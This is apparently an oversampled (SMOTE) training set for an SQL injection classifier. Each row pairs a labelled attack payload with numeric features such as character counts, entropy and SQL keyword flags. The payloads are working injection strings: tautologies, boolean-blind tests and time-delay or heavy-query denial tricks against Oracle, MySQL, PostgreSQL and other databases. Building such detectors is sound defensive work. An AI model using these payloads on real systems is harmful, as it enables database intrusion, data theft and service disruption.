id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000292,attack,boolean,"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000794,0.28873788246338794,268.8177122258837,39.72742925803876,3.872033297797144,83.0,35.0,106.81771222588372,44.0,0.30877723451971417,0.13020726756855416,0.39732636153983497,0.16368913637189667,0.8637146290193807,0.0,2.0,0.0,0.0,2.0,0.0,23.13628537098062,0.0,1.9999999999999998,4.0,14.0,0.8637146290193806,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000293,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001122,1.0697056164467997,199.47661479107217,34.95322958214432,3.8681958168745796,58.0,35.0,76.0,30.47661479107216,0.2907627221637642,0.1754602633746853,0.38099942904217377,0.15277758541937675,0.0,0.4766147910721567,2.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,3.0,10.0,0.0,0.47661479107215676,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000295,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000774,0.038065621365581545,142.72957849151155,32.0,4.144808185088938,69.72957849151155,16.0,41.0,16.0,0.4884327077171917,0.11212433803458811,0.287318616213632,0.11212433803458811,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000179,0.9783000279944595,49.10151161286544,18.585930230409346,3.425988005157146,11.515581382456077,17.0,17.171860460818692,3.4140697695906503,0.23136285013145308,0.3479804711885845,0.35004680979957026,0.07060986888039218,0.4140697695906532,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.9999999999999996,0.4140697695906531,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R001153,0.010244982351125385,377.0,31.0,3.2168845130478503,88.0,50.0,184.0,55.0,0.23342175066312998,0.13262599469496023,0.4880636604774536,0.14588859416445624,4.0,0.0,1.0,0.0,0.0,2.0,0.0,37.99999999999999,0.0,0.0,0.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000298,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000403,0.04919736588247183,28.999999999999986,14.0,3.2257858217739854,2.0,12.0,10.0,5.0,0.06896551724137931,0.41379310344827586,0.3448275862068966,0.1724137931034483,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000299,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",nearest_attack_euclidean,R000123,0.12462992434183386,148.1319546358306,29.619501890173726,4.021829320758472,73.0,10.0,43.6099621965255,21.5219924393051,0.4957570424850759,0.06791192362809259,0.29116980970239414,0.14516122418443733,4.0,0.0,0.0,0.0,1.0,2.0,0.0,5.5219924393051,0.0,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000300,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001441,1.1911874099171775,152.77637210031295,29.984207308553543,3.6105080361221926,39.507896345723225,16.0,66.22109768025038,31.047378074339363,0.26166830042529104,0.10612540507167724,0.4285610822491297,0.20364521225390203,0.0,4.0,0.0,0.0,0.0,2.0,0.0,13.047378074339367,2.0,1.9999999999999998,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5078963457232275,0.49210365427677233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000301,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R001270,0.3012232659329925,277.39938209019766,36.173374527320156,3.7122847843980313,85.30650189071937,29.0,116.26625472679844,46.826625472679844,0.30754007641030223,0.10458784257930281,0.41902188998463935,0.1688501910257556,0.0,4.0,0.0,0.0,0.0,1.1733745273201568,0.0,25.653250945359687,0.0,1.9999999999999998,4.0,11.173374527320156,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000302,attack,boolean,"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000223,0.008067450262583526,167.8506580347552,28.0,3.6695158517305617,66.0,10.0,63.88052642780418,27.970131606951043,0.39322847233672975,0.05958007156617118,0.3805562961741549,0.16663515992294414,0.0,4.0,0.0,0.0,1.0,2.0,0.0,9.970131606951044,2.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000303,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky",nearest_attack_euclidean,R000690,0.23479060186128356,286.0416406417825,36.0,3.6331178554717534,85.54761607334657,29.0,123.05950447675274,48.43452009168321,0.2993810353762976,0.10155229778753627,0.4296958698768586,0.1693707969593075,4.0,0.0,0.0,0.0,0.0,1.1130959816633568,0.0,27.321424110019862,0.0,1.9999999999999998,4.0,11.113095981663356,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000304,attack,boolean,-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,nearest_attack_euclidean,R000657,1.3193051204081854,364.4371861499686,37.42964826874608,3.70774221340163,103.14824134373038,46.71105519376177,152.57788961247644,62.0,0.2829940869155976,0.1282323716096473,0.41862817247790096,0.17014536899685417,4.0,0.0,0.5703517312539246,0.0,0.0,2.5703517312539246,0.0,30.85929653749215,0.0,3.0,0.0,23.14070346250785,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.4296482687460754,0.5703517312539246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000305,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000862,0.6951185341943198,145.76874323858752,30.179162159058347,3.2235861618815767,40.35832431811669,13.0,74.0,18.41041892047083,0.2765661436166584,0.0892076199111479,0.507797221032688,0.12642901543950577,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,0.41041892047082673,0.0,0.0,1.9999999999999996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000306,attack,boolean,"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",nearest_attack_euclidean,R001180,1.6953230087308768,318.30878460776,39.557719615194,3.9281510304737046,116.69263538232799,34.0,122.94299037984999,44.673158845581995,0.36686629028229056,0.10723839007537164,0.3852906574785811,0.14060466216375675,0.0,4.0,0.0,0.0,0.0,1.4422803848060004,0.0,25.346317691163996,0.8845607696120008,3.0,3.0,7.442280384806001,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000307,attack,boolean,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",nearest_attack_euclidean,R001362,0.19668945840968685,385.77288796961653,41.0571054366765,3.5947023115988084,114.543156506588,35.0,176.45815320973452,59.771578253294,0.2969741426760571,0.09078182820624037,0.4572725414792282,0.1549714876384743,4.0,0.0,0.0,0.0,0.0,2.0,0.0,37.657367379941,0.11421087335299898,1.9999999999999998,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000308,attack,boolean,"-5231%"" or 4945  =  8402#",nearest_attack_euclidean,R001490,1.5122846299921198,24.999999999999986,15.017399749525476,3.5946616694771465,2.0,12.0,6.0,5.0,0.08000000000000002,0.48,0.24,0.2,0.49130012523726263,0.5086998747627375,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.9999999999999996,0.49130012523726246,0.5086998747627375,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000309,attack,boolean,-7548 or 2850  =  9666,nearest_attack_euclidean,R000625,0.0870953003256999,21.999999999999986,12.715954689560037,3.3226321954390854,2.0,12.0,6.0,2.0,0.09090909090909091,0.5454545454545454,0.2727272727272727,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000310,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R001257,0.03588352345853032,21.999999999999986,10.736530885500379,3.1248336375382406,2.0,12.0,6.0,2.0,0.09090909090909091,0.5454545454545454,0.2727272727272727,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000311,attack,boolean,1'   )    )     )   and 5934  =  2309,nearest_attack_euclidean,R001234,0.273735529874662,36.88428167863459,13.537126714538383,2.598098107809218,3.0,9.0,20.0,4.884281678634595,0.08134170793100318,0.2440251237930095,0.5422780528733544,0.13235511540263295,0.8842816786345958,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,0.8842816786345958,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000312,attack,boolean,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",nearest_attack_euclidean,R000441,0.36458466177543725,128.1691096304893,33.0,3.6674371822430687,35.107853826014285,21.892146173985715,54.892146173985715,16.27696345650357,0.27435327510677554,0.17049204858781772,0.42803407809521377,0.12712059821019298,2.553926913007143,0.0,0.0,1.0,0.0,2.0,0.0,9.723036543496429,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000313,attack,boolean,1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,nearest_attack_euclidean,R001552,0.3102228017638937,384.36766930382794,31.0,3.154853502527011,88.8774435653907,47.36766930382791,192.0,56.12255643460931,0.23123395618721299,0.12322960106717003,0.4995249750596539,0.14601146768596315,4.0,0.0,0.12255643460930243,0.0,0.0,2.0,0.0,40.0,0.0,0.0,0.0,12.1225564346093,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.8774435653906976,0.12255643460930243,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000314,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",nearest_attack_euclidean,R000599,0.3324167166641045,89.32175749106324,28.0,3.788674201742467,32.0,16.0,31.847220706625635,9.474536784437605,0.3588026707034229,0.17940133535171146,0.3557801967403064,0.10601579720455925,0.0,0.0,0.0,0.0,1.0,1.0,0.0,5.474536784437605,0.0,1.0,1.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000315,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",nearest_attack_euclidean,R000795,0.31652762196038486,141.97938434620707,32.0,4.140172256330002,76.0,8.0,41.14948695517255,16.82989739103451,0.5375874683632527,0.056588154564552906,0.28749342576275005,0.11833095130944438,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.82989739103451,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000316,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000021,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000317,attack,boolean,1   )    )    and 4595  =  4595#,nearest_attack_euclidean,R001081,0.5059596786281698,33.15412351472757,11.494624363454667,2.585709136962641,3.0,9.0,16.65949915127289,4.494624363454665,0.09097566462805876,0.2729269938841763,0.5021137793310029,0.1339835621567621,0.16487478781822196,0.0,0.0,0.0,0.0,1.0,0.0,2.1648747878182224,0.16487478781822218,0.0,0.0,1.0,0.16487478781822196,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000318,attack,boolean,"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000398,0.008291165732468882,94.86744575476723,27.977145819787456,3.2435165490768862,11.981716655829963,16.0,47.90858327914982,18.977145819787456,0.12629246144284523,0.1687593090787439,0.5048928254051683,0.20005540407324254,4.0,0.0,1.0,0.0,0.0,2.0,0.0,7.981716655829964,2.0,0.9954291639574909,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000319,attack,boolean,"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",nearest_attack_euclidean,R000556,0.13203975173698096,99.18324725859927,27.0,3.365400634142572,20.0,16.0,46.546597806879404,16.63664945171985,0.2019731318494195,0.16157850547953562,0.46876406376695195,0.1676842989040929,4.0,0.0,1.0,0.0,0.0,2.0,0.0,7.636649451719852,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000872,0.46878323595992155,63.23221292020244,21.821475280134962,3.5343387730042837,12.76778707979755,18.642950560269927,24.0,7.821475280134964,0.2025686893460581,0.2942717903457305,0.37975853347770255,0.12340098683050885,1.0,0.0,2.0,0.0,0.0,2.0,0.0,2.4107376400674827,0.0,0.0,0.41073764006748203,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000321,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000258,0.4434748393361731,136.0,32.0241535438905,4.096444862069564,68.58453740361674,8.51207677194525,40.903385824438004,18.0,0.5042980691442408,0.06258879979371507,0.30076018988557357,0.1323529411764706,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.975846456109501,1.0,0.0,2.512076771945249,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
